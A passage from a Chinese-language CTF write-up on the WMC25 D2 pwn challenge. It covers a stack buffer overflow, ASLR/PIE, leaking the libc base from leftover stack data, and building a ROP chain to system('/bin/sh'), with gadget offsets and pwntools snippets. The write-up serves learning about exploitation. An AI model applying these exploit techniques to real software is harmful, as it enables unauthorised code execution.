   exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解决扫雷游戏</span></span><br><span class="line">    solve_minesweeper(conn)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取金丝雀并发送 exploit payload</span></span><br><span class="line">    get_canary_and_exploit(conn)</span><br><span class="line"></span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure><h1 id="wmc25-d2"><a class="markdownIt-Anchor" href="#wmc25-d2"></a> WMC25 D2</h1><p>难度再次升级！这次直接把后门函数 <code>win</code>给去掉了，我们需要如何执行之前的 <code>system(&quot;/bin/sh&quot;)</code> ？这个语句根本不在编译后的可链接程序里！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; <span class="built_in">printf</span>(<span class="string">&quot;You are the W4ter Minesweeper Champion (WMC) !\n&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>] = &#123;&#125;;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You win! Please sign your name: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x408</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nLeaderboard\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;01 %16s ... %ds\n\n&quot;</span>, buf, last);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(buf) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your name is too long, which will break our award ceremony!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Just give us another shorter nickname: &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Thanks for playing my game.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而不仅于此！程序还使用了地址空间随机化 ASLR，编译开启 PIE，也就是说每一次 executable 加载的基地址是不确定的（但一般高字节为<code>0x55</code>），而且动态库 <code>libc</code> 加载的基地址也是不确定的（一般为高字节为 <code>0x7f</code>，但是要区别于用户程序栈）！</p><h2 id="-code9-"><a class="markdownIt-Anchor" href="#-code9-"></a> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file=./pwn</span><br><span class="line">RELRO            FULL RELRO</span><br><span class="line">STACK CANARY     Canary found</span><br><span class="line">NX               NX enabled</span><br><span class="line">PIE              PIE enabled</span><br><span class="line">RPATH            No RPATH</span><br></pre></td></tr></table></figure></h2><p><code>system</code> 函数以及 <code>/bin/sh</code> 字符串其实都位于动态库 <code>libc.so.6</code> 里，如果我们想要读取 libc 里面的 <code>.rodata</code> 并执行 <code>.text</code> 里的函数呢，那么就得知道 libc 被加载的基地址！</p><h3 id="putsplt-打印-libc-函数地址"><a class="markdownIt-Anchor" href="#putsplt-打印-libc-函数地址"></a> &lt;puts@plt&gt; 打印 libc 函数地址</h3><p>第一次的想法是通过程序里的 <code>&lt;puts@plt&gt;</code>  跳转到在 <code>libc</code> 地址空间中实际执行 <code>puts</code> 函数的 <code>puts@got</code> ，通过<code>puts@plt(read@got)</code> 打印 <code>read</code> 的实际地址。得到实际地址后减去<code>read</code>在 libc 中固定的偏移量就能得到 libc 运行时的基址了！函数在 PLT 表中的偏移量我们可以反汇编 executable 得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .plt.sec:</span><br><span class="line"></span><br><span class="line">0000000000001120 &lt;puts@plt&gt;:</span><br><span class="line">    1120:f3 0f 1e fa          endbr64 </span><br><span class="line">    1124:f2 ff 25 5d 2e 00 00 bnd jmp *0x2e5d(%rip)        # 3f88 &lt;puts@GLIBC_2.2.5&gt;</span><br><span class="line">    112b:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)</span><br><span class="line"></span><br><span class="line">0000000000001140 &lt;__stack_chk_fail@plt&gt;:</span><br><span class="line">    1140:f3 0f 1e fa          endbr64 </span><br><span class="line">    1144:f2 ff 25 4d 2e 00 00 bnd jmp *0x2e4d(%rip)        # 3f98 &lt;__stack_chk_fail@GLIBC_2.4&gt;</span><br><span class="line">    114b:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)</span><br><span class="line"></span><br><span class="line">0000000000001170 &lt;read@plt&gt;:</span><br><span class="line">    1170:f3 0f 1e fa          endbr64 </span><br><span class="line">    1174:f2 ff 25 35 2e 00 00 bnd jmp *0x2e35(%rip)        # 3fb0 &lt;read@GLIBC_2.2.5&gt;</span><br><span class="line">    117b:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)</span><br></pre></td></tr></table></figure><p>查找一下 <code>read@got</code> 的地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r ./pwn | grep <span class="built_in">read</span>  或 objdump -R ./demo</span><br><span class="line">000000003fb0  R_X86_64_JUMP_SLO 0000000000000000 <span class="built_in">read</span>@GLIBC_2.2.5 + 0</span><br></pre></td></tr></table></figure><p>这里 <code>0x3fb0</code> 是 <code>read@got</code> 这一项<strong>在进程虚拟地址空间中的地址</strong> 。它的<strong>初始内容（值）是一个函数地址</strong>，指向懒绑定解析器，比如 <code>ld.so</code> 的 <code>_dl_runtime_resolve</code>。第一次调用 <code>read@plt</code>，解析器解析符号并更新 <code>0x3fb0</code> 的内容为 <code>libc</code> 中 <code>read()</code> 的真实地址，比如 <code>0x7ffff7d12345</code>。具体解析过程如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[调用 read@plt]</span><br><span class="line">   ↓</span><br><span class="line">jmp *[read@got]  ← 间接跳转</span><br><span class="line">       ↓</span><br><span class="line">     如果首次调用 → ld.so 解析符号 → 把 libc 中 read 的地址写入 read@got</span><br><span class="line">     否则        → 直接跳到 libc 中的 read 函数</span><br></pre></td></tr></table></figure><p>函数和参数都已齐全，接下来需要考虑如何传参。x86-64 ABI 规定第一个参数用<code>rdi</code>来传递，我们需要在可执行程序中找到一种 <code>Gadget</code>，形如 <code>pop rdi ; ret</code>。这样我们就可以构造如下的 ROP 链：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 栈由上往下地址减小</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|      <span class="selector-tag">puts</span>@<span class="selector-tag">plt</span> (<span class="number">0</span>x1120)     | ← 调用 <span class="selector-tag">puts</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|      <span class="number">0</span><span class="selector-tag">x3fb0</span> (read<span class="variable">@got</span>)     | ← 参数</span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">| <span class="selector-tag">pop</span> <span class="selector-tag">rdi</span> ; <span class="selector-tag">ret</span>  <span class="selector-tag">Gadget</span> <span class="selector-tag">addr</span> | ← 控制 <span class="selector-tag">rdi</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|       <span class="selector-tag">old</span> <span class="selector-tag">rbp</span> <span class="selector-tag">value</span>        | </span><br><span class="line">+<span class="selector-tag">----------------------------</span>+ ←  %<span class="selector-tag">rbp</span></span><br></pre></td></tr></table></figure><p>ROP 链设计完毕，接下来就是最后一步，找到 <code>Gadget</code>！但令人遗憾的是，我找遍了整个 executable 连比较合适的都没有，更不用说完美的 <code>pop rdi ; ret</code>了。下面找的是两个最可能合适的，但是 <code>rip</code>的值不在我们的控制范围内，因此这个想法倒在了最后一步上。OUT</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000000012</span>c3 &lt;vuln&gt;:</span><br><span class="line">    <span class="number">1318</span>:<span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">42</span> <span class="number">0</span>d <span class="number">00</span> <span class="number">00</span> lea    <span class="number">0xd42</span>(%rip),%rax        # <span class="number">2061</span> &lt;_IO_stdin_used+<span class="number">0x61</span>&gt;</span><br><span class="line">    <span class="number">131f</span>:<span class="number">48</span> <span class="number">89</span> c7             mov    %rax,%rdi</span><br><span class="line">    <span class="number">1322</span>:e8 f9 fd ff ff       call   <span class="number">1120</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">    <span class="number">1327</span>:<span class="number">48</span> <span class="number">8b</span> <span class="number">15</span> <span class="number">42</span> <span class="number">2</span>d <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x2d42</span>(%rip),%rdx</span><br><span class="line">    <span class="number">1355</span>:<span class="number">48</span> <span class="number">83</span> f8 <span class="number">10</span>          cmp    $<span class="number">0x10</span>,%rax</span><br><span class="line">    <span class="number">1359</span>:<span class="number">76</span> <span class="number">25</span>                jbe    <span class="number">1380</span> &lt;vuln+<span class="number">0xbd</span>&gt;</span><br><span class="line">    <span class="number">135b</span>:<span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">1</span>e <span class="number">0</span>d <span class="number">00</span> <span class="number">00</span> lea    <span class="number">0xd1e</span>(%rip),%rax        # <span class="number">2080</span> &lt;_IO_stdin_used+<span class="number">0x80</span>&gt;</span><br><span class="line">    <span class="number">1362</span>:<span class="number">48</span> <span class="number">89</span> c7             mov    %rax,%rdi</span><br><span class="line">    <span class="number">1365</span>:e8 b6 fd ff ff       call   <span class="number">1120</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="读取栈存留的-libc-函数调用信息"><a class="markdownIt-Anchor" href="#读取栈存留的-libc-函数调用信息"></a> 读取栈存留的 libc 函数调用信息</h3><p>既然无法通过 puts 来获得基址，第二次尝试读取在<strong>main栈帧</strong>中存留的关于 libc 的地址信息。获得libc的信息后尝试得到 libc 的基址，有了基址后我们就可以很轻松地找到libc中 <code>pop rdi; ret;</code> 的 gadget，把<code>&quot;/bin/sh&quot;</code>的运行时地址 pop 到 rdi，然后跳转到 system。</p><p>一开始的思路多了一个计算程序运行基址的阶段，其实没有必要：</p><ol><li><strong>Stage 1</strong>：泄露栈金丝雀</li><li><s><strong>Stage 2</strong>：泄露 <code>main</code> 函数的返回地址，计算 Executable 基地址。</s></li><li><strong>Stage 3</strong>：泄露 Libc 的运行时地址，计算 Libc 基地址。</li><li><strong>Stage 4</strong>：构造最终 ROP 链，使用 Libc gadget 调用 <code>system(&quot;/bin/sh&quot;)</code>。**</li></ol><p><strong>这个思路的重点在于读取栈上残留的 libc 信息，并分析这个信息来计算其在 libc 中的偏移量，从而得到 libc 运行基址。</strong></p><p>先准备一下 ROP 调用链需要的东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找一个 Gatget 入口地址</span></span><br><span class="line">$ ROPgadget --binary libc.so.6 --only <span class="string">&quot;pop|ret&quot;</span> | grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line">0x000000000002a3e5 : pop ret ; ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># system 函数入口地址</span></span><br><span class="line">$ nm -D libc.so.6 | grep system</span><br><span class="line">0000000000050d70 T __libc_system@@GLIBC_PRIVATE</span><br><span class="line"></span><br><span class="line"><span class="comment"># /bin/sh 字符串字面量地址</span></span><br><span class="line">$ strings -a -t x libc.so.6 | grep <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"> 1d8678 /bin/sh</span><br></pre></td></tr></table></figure><p>这里我们还是要跳过 <code>endbr64</code>，所以实际的 system 入口地址偏移量为 <code>0x50d74</code> 。</p><p>现在详细拆解 Stage 3 的过程：</p><p>由于我们发现 Executable 中似乎缺少方便的 <code>pop rdi; ret;</code> 或类似 gadget 来构建标准的 <code>puts(read@got)</code> 泄露链，我们将利用 <code>vuln</code> 函数中 <code>read(0, buf, 0x408)</code> 和 <code>printf(&quot;01 %16s ... %ds\n\n&quot;, buf, last)</code> 的巨大溢出和打印特性来泄露 Libc 地址。</p><p>因此我们将在第三次输入时不断尝试发送精心构造的 payload。这个 payload 的长度需 <strong>长度足够大，以溢出到 <code>main</code> 函数的栈帧甚至更高地址：</strong> 这部分溢出的数据本身不重要，重要的是它会导致 <code>printf</code> 在打印完固定格式的内容后，继续从溢出所到达的栈内存区域读取并打印数据。</p><p>那么问题来了，<strong>栈上可能存有哪些 Libc 信息？</strong></p><p>当 <code>main</code> 函数调用 <code>vuln</code> 时，<code>main</code> 函数的栈帧位于 <code>vuln</code> 函数的栈帧之上。<code>main</code> 函数在调用 <code>vuln</code> 之前和之后，还会调用许多其他的 Libc 函数，例如 <code>setvbuf</code>、<code>printf</code>、<code>time</code>、<code>scanf</code>、<code>toupper</code>、<code>exit</code> 等。在这些函数调用过程中，<code>main</code> 函数的栈帧上可能会存放以下与 Libc 相关的信息：</p><ul><li><strong>从 Libc 函数返回的地址</strong>：这个地址可能就是 libc 函数中一个指令的实际地址</li><li><strong>指向 Libc 数据结构的指针：</strong> 例如，<code>setvbuf</code> 函数会操作 <code>stdin</code>、<code>stdout</code>、<code>stderr</code> 这些 <code>FILE</code> 结构体。<code>main</code> 函数的局部变量或传递给其他函数的参数中，可能保存着指向这些位于 Libc 数据段的 <code>FILE</code> 结构体的指针。</li><li><strong>Libc 函数在 GOT 表中的运行时地址的拷贝 (可能性较低，除非有特定代码这样做)。</strong></li></ul><p>为了从 Stage 3 的输出来解析出这些地址。关键在于<strong>识别地址模式：</strong> 在 64 位 Linux 系统中，Libc 的地址通常以 <code>0x7f</code> 开头（或者以 <code>0x7f</code> 作为其 8 字节表示的最后一个字节）。在解析输出时，寻找以 <code>\x7f</code> 结尾的 8 字节序列，这些很可能是 Libc 的地址。所以我们不断实验输入 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>≡</mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mn>8</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">size ≡ 0(mod 8)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord">8</span><span class="mclose">)</span></span></span></span> 的payload，看看溢出结果会不会符合地址要求。</p><p>我们不知道在栈上哪个位置会有 libc 函数信息，也不知道这个信息是什么，所以需要不断尝试＋猜测。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test.py 本地测试executable</span></span><br><span class="line">libc_line = r.recvline() <span class="comment"># 接收打印 padding 后的值</span></span><br><span class="line">log.info(<span class="string">f&quot;接收到的 libc 行: <span class="subst">&#123;libc_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">end_index = libc_line.index(<span class="number">0x20</span>)  <span class="comment"># 找到第一个 0x20 的位置</span></span><br><span class="line"><span class="keyword">if</span> end_index == <span class="number">0</span>:</span><br><span class="line">log.error(<span class="string">&quot;libc 行为空！没能读到相关信息&quot;</span>)</span><br><span class="line">libc_partial_bytes = libc_line[:end_index]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填充到8字节，不足部分用0x00补齐</span></span><br><span class="line">libc_bias = libc_partial_bytes.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;成功提取到部分的 libc 指令地址为: <span class="subst">&#123;libc_partial_bytes&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;重构完整的 libc 指令地址: <span class="subst">&#123;<span class="built_in">int</span>.from_bytes(libc_bias, byteorder=<span class="string">&#x27;little&#x27;</span>):#x&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(libc_bias) != <span class="number">8</span>:</span><br><span class="line"> log.warning(<span class="string">f&quot;重构后的 libc 地址长度不是 8 (<span class="subst">&#123;<span class="built_in">len</span>(libc_bias)&#125;</span>)！&quot;</span>)</span><br><span class="line"> log.info(<span class="string">f&quot;返回地址行所有字节 (hex): <span class="subst">&#123;libc_line.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;/proc/<span class="subst">&#123;pid&#125;</span>/maps&#x27;</span>) <span class="keyword">as</span> maps_file:</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> maps_file:</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;libc&#x27;</span> <span class="keyword">in</span> line <span class="keyword">and</span> <span class="string">&#x27;r--p&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">addr = <span class="built_in">int</span>(line.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">f&quot;通过系统查看 libc 基地址为: <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&quot;</span>)</span><br><span class="line">libc_base_addr =addr</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>通过不断地测试，在发送 32 + 7 * 8= 88 字节 payload 时，得到了一个 <code>0x7f</code> 开头的地址，对比测试时具体的 libc 地址，得到这个 libc 指令的偏移量为 <code>0x29d90</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">29d90:    89 c7      mov    %eax,%edi</span><br></pre></td></tr></table></figure><p>那么我们对这个偏移量进行尝试，在实际的脚本中发送同样大小的 payload，得到实际 libc 指令地址再减去偏移量就能得到 libc 加载的基址了：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi><mi>i</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">_</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>i</mi><mi>n</mi><mi>t</mi><mo stretchy="false">(</mo><mi>i</mi><mi>n</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>u</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo stretchy="false">)</mo><mo>−</mo><mi>L</mi><mi>I</mi><mi>B</mi><mi>C</mi><mi mathvariant="normal">_</mi><mi>O</mi><mi>F</mi><mi>F</mi><mi>S</mi><mi>E</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">libc\_base\_addr = int(instruction\_addr) - LIBC\_OFFSET</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p><p>有了 Libc 基址后，我们根据偏移量计算我们需要的东西的实际运行时地址：</p><ol><li><strong>计算 Libc 中 Gadget 的运行时地址：</strong></li></ol><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>o</mi><mi>p</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>d</mi><mi>i</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mi>t</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>l</mi><mi>i</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">_</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>+</mo><mi>P</mi><mi>O</mi><mi>P</mi><mi mathvariant="normal">_</mi><mi>R</mi><mi>D</mi><mi>I</mi><mi mathvariant="normal">_</mi><mi>O</mi><mi>F</mi><mi>F</mi><mi>S</mi><mi>E</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">pop\_rdi\_retaddr = libc\_base\_addr + POP\_RDI\_OFFSET</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">o</span><span class="mord mathdefault">p</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p><ol start="2"><li><strong>计算 Libc 中 <code>/bin/sh</code> 字符串的运行时地址：</strong></li></ol><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mi>i</mi><mi>n</mi><mi>s</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>l</mi><mi>i</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">_</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>+</mo><mi>B</mi><mi>I</mi><mi>N</mi><mi>S</mi><mi>H</mi><mi mathvariant="normal">_</mi><mi>O</mi><mi>F</mi><mi>F</mi><mi>S</mi><mi>E</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">binsh\_addr=libc\_base\_addr+BINSH\_OFFSET</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord 